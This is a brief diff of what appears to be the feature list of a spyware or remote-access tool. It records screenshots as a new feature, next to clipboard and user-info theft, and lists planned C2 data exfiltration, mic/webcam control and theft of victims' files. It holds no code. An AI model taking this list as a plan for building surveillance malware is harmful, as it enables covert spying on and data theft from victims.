@@ -7,10 +7,11 @@ Features:
 - Retrieve user info
 - Retrieve clipboard contents
 - View directory contents
+- Screenshots
+
 
 To-do:
 - Send data in a digestible manner to C2 server
-- Screenshots
 - Mic/Webcam Control
 - Send Victim's files to C2
 - Comment/Document
